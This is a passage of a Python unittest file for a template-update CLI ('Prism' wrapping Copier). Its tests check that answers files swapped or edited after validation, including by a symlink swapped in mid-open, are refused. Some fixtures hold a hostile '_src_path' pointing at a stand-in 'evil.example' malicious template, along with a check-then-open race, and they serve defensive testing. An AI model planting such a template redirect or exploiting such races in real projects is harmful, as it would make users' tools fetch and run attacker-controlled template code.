        self.assertEqual("", git(ws, "log", "--format=%s", "main..HEAD").stdout.strip(), "no layer was committed")

    # -- recopy -----------------------------------------------------------------

    def test_a_recopy_gives_copier_the_validated_answers_of_every_layer_in_a_private_file_and_never_the_live_path(self) -> None:
        ws = self.copy_workspace("recopy-spy")
        originals = {relative: read_yaml(ws / relative) for relative in self.LAYER_FILES}
        recorder = CopierRecorder(ws)
        app_reads: list[str] = []
        real_snapshot = cli.read_answers_snapshot

        def counting_snapshot(project, answers_file):
            app_reads.append(answers_file)
            return real_snapshot(project, answers_file)

        with patch.object(subprocess, "run", recorder), patch.object(cli, "read_answers_snapshot", counting_snapshot), patch.object(cli, "read_app_answers", side_effect=AssertionError("answers are not read again")):
            code, out, err = run_cli("update", str(ws), "--strategy", "recopy", "--yes", "--trust-template")
        self.assertEqual(0, code, out + err)
        self.assertEqual(3, len(recorder.calls), "one Copier run per layer")
        for call, relative in zip(recorder.calls, self.LAYER_FILES):
            with self.subTest(layer=relative):
                self.assertNotEqual(relative, call["answers_file"], "the live answers file is never passed")
                self.assertTrue(Path(call["answers_file"]).name.startswith(".copier-answers.prism-recopy."))
                self.assertEqual(Path(relative).parent, Path(call["answers_file"]).parent)
                self.assertEqual(originals[relative], call["content"], "Copier got exactly the validated content")
        for relative in self.LAYER_FILES[1:]:
            self.assertEqual(1, app_reads.count(relative), f"{relative} is read once")
        self.assertEqual([], list(ws.rglob(".copier-answers.prism-recopy.*")), "no private file is left behind")

    def test_an_answers_file_that_changes_before_copier_starts_is_never_consumed_and_the_recopy_refuses(self) -> None:
        ws = self.copy_workspace("recopy-swap-before")
        relative = "services/api-two/.copier-answers.yml"
        real_branch = cli.create_branch

        def swap_after_the_plan(project, name):
            real_branch(project, name)
            self.hostile(ws, relative)

        copier = CopierSpy()
        with patch.object(subprocess, "run", copier), patch.object(cli, "create_branch", swap_after_the_plan):
            code, out, err = run_cli("update", str(ws), "--strategy", "recopy", "--yes", "--trust-template")
        self.assertEqual([], copier.calls, "Copier never started")
        self.assert_nothing_started(ws, code, err, relative)

    def test_an_answers_file_that_changes_while_copier_runs_is_refused_before_anything_is_moved_into_place_or_committed(self) -> None:
        ws = self.copy_workspace("recopy-swap-during")
        original = read_yaml(ws / ".copier-answers.yml")
        swapped: list[bytes] = []
        recorder = CopierRecorder(ws, after=lambda record: swapped.append(self.hostile(ws)))
        with patch.object(subprocess, "run", recorder):
            code, out, err = run_cli("update", str(ws), "--strategy", "recopy", "--yes", "--trust-template")
        self.assert_nothing_started(ws, code, err, ".copier-answers.yml")
        self.assertEqual(1, len(recorder.calls), "the update stopped at the failed layer")
        self.assertEqual(original, recorder.calls[0]["content"], "Copier was given the validated answers, not the changed file")
        self.assertNotIn("app_package", recorder.calls[0]["content"])
        self.assertEqual(swapped[0], (ws / ".copier-answers.yml").read_bytes(), "the private file was not moved over the changed original")
        self.assertEqual([], list(ws.glob(".copier-answers.prism-recopy.*")))

    # -- smart update -----------------------------------------------------------

    def test_a_smart_update_prepares_the_manifest_from_the_validated_bytes_and_refuses_a_file_that_changed_before_copier_starts(self) -> None:
        ws = self.copy_workspace("update-swap")
        validated = (ws / ".copier-answers.yml").read_bytes()
        real_identity = cli.has_commit_identity
        swapped: list[bytes] = []

        def swap_after_the_plan(project):
            swapped.append(self.hostile(ws))
            return real_identity(project)

        copier = CopierSpy()
        prepared = patch.object(cli, "prepare_manifest_update", wraps=cli.prepare_manifest_update)
        with patch.object(subprocess, "run", copier), patch.object(cli, "has_commit_identity", swap_after_the_plan), prepared as prepare:
            code, out, err = run_cli("update", str(ws), "--yes", "--trust-template")
        self.assertEqual([], copier.calls, "Copier never started")
        prepare.assert_called_once()
        self.assertEqual(validated, prepare.call_args.args[2], "the manifest was prepared from the validated bytes")
        self.assertNotEqual(swapped[0], prepare.call_args.args[2])
        self.assert_nothing_started(ws, code, err, ".copier-answers.yml")

    def test_a_layer_that_changes_before_its_turn_stops_the_smart_update_before_the_workspace_layer_runs(self) -> None:
        ws = self.copy_workspace("update-swap-app")
        relative = "backend/.copier-answers.yml"
        real_branch = cli.create_branch

        def swap_after_the_plan(project, name):
            real_branch(project, name)
            self.hostile(ws, relative)

        copier = CopierSpy()
        with patch.object(subprocess, "run", copier), patch.object(cli, "create_branch", swap_after_the_plan):
            code, out, err = run_cli("update", str(ws), "--yes", "--trust-template")
        self.assertEqual([], copier.calls)
        self.assert_nothing_started(ws, code, err, relative)

    def test_a_smart_update_whose_result_records_another_answer_than_the_validated_one_is_refused_before_the_commit(self) -> None:
        ws = self.copy_workspace("update-diverged")

        def copier_that_consumed_other_answers(command) -> subprocess.CompletedProcess:
            data = read_yaml(ws / ".copier-answers.yml")
            data["project_name"] = "Another Name"
            (ws / ".copier-answers.yml").write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
            return subprocess.CompletedProcess(command, 0)

        recorder = CopierRecorder(ws, fake=copier_that_consumed_other_answers)
        with patch.object(subprocess, "run", recorder):
            code, out, err = run_cli("update", str(ws), "--yes", "--trust-template")
        self.assert_nothing_started(ws, code, err, ".copier-answers.yml")
        self.assertEqual(1, len(recorder.calls))
        self.assertEqual([".copier-answers.yml"], [call["answers_file"] for call in recorder.calls], "a smart update lets Copier read the tracked file itself")

    def test_a_smart_update_keeps_every_validated_answer_and_moves_each_layer_to_the_new_revision(self) -> None:
        ws = self.copy_workspace("update-clean")
        before = {relative: read_yaml(ws / relative) for relative in self.LAYER_FILES}
        code, out, err = run_cli("update", str(ws), "--yes", "--trust-template")
        self.assertEqual(0, code, out + err)
        for relative in self.LAYER_FILES:
            with self.subTest(layer=relative):
                after = read_yaml(ws / relative)
                self.assertEqual("v2.0.0", after["_commit"])
                self.assertEqual({key: value for key, value in before[relative].items() if key != "_commit"}, {key: value for key, value in after.items() if key != "_commit"})

    # -- scaffolding ------------------------------------------------------------

    def scaffold_plan(self, ws: Path) -> dict:
        plan = app_cli.plan_app_add(ws, "api-three", "spring-backend", path="services/api-three", scaffold=True)
        self.assertEqual([], plan["conflicts"])
        return plan

    def test_a_scaffold_refuses_a_root_answers_file_that_changed_after_the_preview(self) -> None:
        ws = self.copy_workspace("scaffold-preview")
        plan = self.scaffold_plan(ws)
        self.assertEqual(64, len(plan["scaffold"]["answers_digest"]))
        with (ws / ".copier-answers.yml").open("a", encoding="utf-8", newline="\n") as handle:
            handle.write("# edited after the preview\n")
        git(ws, "commit", "-qam", "Edit the answers file")
        copier = CopierSpy()
        with patch.object(subprocess, "run", copier):
            receipt = app_cli.apply_app_add(ws, plan, trust_template=True)
        self.assertEqual("conflict", receipt["status"], receipt)
        self.assertTrue(any("changed after the preview" in item for item in receipt["conflicts"]), receipt)
        self.assertEqual([], copier.calls)
        self.assertFalse((ws / "services" / "api-three").exists())

    def test_a_scaffold_refuses_a_root_answers_file_that_changes_before_copier_starts(self) -> None:
        ws = self.copy_workspace("scaffold-swap")
        plan = self.scaffold_plan(ws)
        real_branch = cli.create_branch

        def swap_after_the_checks(project, name):
            real_branch(project, name)
            self.hostile(ws)

        copier = CopierSpy()
        with patch.object(subprocess, "run", copier), patch.object(cli, "create_branch", swap_after_the_checks):
            receipt = app_cli.apply_app_add(ws, plan, trust_template=True)
        self.assertEqual("conflict", receipt["status"], receipt)
        self.assertTrue(any("`.copier-answers.yml` changed after Prism read and validated it" in item and "run the command again" in item for item in receipt["conflicts"]), receipt)
        self.assertEqual([], copier.calls)
        self.assertFalse((ws / "services" / "api-three").exists())


class ManifestPreparationAnswersTests(unittest.TestCase):
    """The workers that render the manifest get the validated bytes in a private folder, never the live file."""

    VALIDATED = b"_src_path: https://example.test/t.git\n_commit: v1.0.0\nproject_name: Validated\n"
    LIVE = b"_src_path: https://evil.example/malicious-template.git\n_commit: v1.0.0\nproject_name: Hostile\n"

    def prepare(self, **arguments) -> list[bytes]:
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary)
            write_workspace_manifest(
                project,
                {"project_name": "P", "project_slug": "p", "package_identifier": "com.example.p"},
                prism_cli_version="0.5.0",
                template_source="https://example.test/t.git",
                template_version="v1.0.0",
                template_commit="abc123",
            )
            (project / ".copier-answers.yml").write_bytes(self.LIVE)
            seen: list[bytes] = []

            class StopWorker:
                def __init__(self, **kwargs) -> None:
                    seen.append((Path(kwargs["dst_path"]) / ".copier-answers.yml").read_bytes())
                    self.dst = Path(kwargs["dst_path"])
                    seen.append(str(self.dst == project).encode())

                def __enter__(self):
                    return self

                def __exit__(self, *exc) -> bool:
                    return False

                def _ask(self) -> None:
                    raise RuntimeError("stop after the first worker")

            with patch("copier._main.Worker", StopWorker), self.assertRaises(ManifestUpdateError):
                prepare_manifest_update(project, "v1.0.0", **arguments)
            return seen

    def test_the_worker_reads_the_validated_bytes_and_not_the_live_file(self) -> None:
        self.assertEqual([self.VALIDATED, b"False"], self.prepare(answers=self.VALIDATED))

    def test_without_a_snapshot_the_file_is_read_once_in_the_private_folder(self) -> None:
        self.assertEqual([self.LIVE, b"False"], self.prepare())


class SwappedAnswersLinkTests(unittest.TestCase):
    """A link swapped in between the check and the open is refused, and the file behind it is never read."""

    def test_a_link_swapped_in_after_the_check_is_never_read(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            base = Path(temporary).resolve()
            project = base / "project"
            project.mkdir()
            victim = base / "victim.yml"
            victim.write_bytes(b"_src_path: https://evil.example/malicious-template.git\n")
            answers = project / ".copier-answers.yml"
            answers.write_bytes(b"_src_path: https://example.test/t.git\n")
            self.assertEqual(b"_src_path: https://example.test/t.git\n", read_answers_bytes(answers), "a regular file is read as it is")
            real_open = os.open

            def swap_then_open(path, *arguments, **keywords):
                if Path(path) == answers:
                    answers.unlink()
                    link(victim, answers)
                return real_open(path, *arguments, **keywords)

            with patch.object(wiki_paths.os, "open", swap_then_open), self.assertRaises(AnswersRefused) as raised:
                read_answers_bytes(answers)
            self.assertIn("restore it from git", str(raised.exception))
            self.assertEqual(b"_src_path: https://evil.example/malicious-template.git\n", victim.read_bytes())

    def test_a_missing_file_and_a_folder_at_its_place(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            project = Path(temporary).resolve()
            self.assertIsNone(read_answers_bytes(project / ".copier-answers.yml"))
            (project / ".copier-answers.yml").mkdir()
            with self.assertRaises(OSError):
                read_answers_bytes(project / ".copier-answers.yml")


if __name__ == "__main__":
    unittest.main()
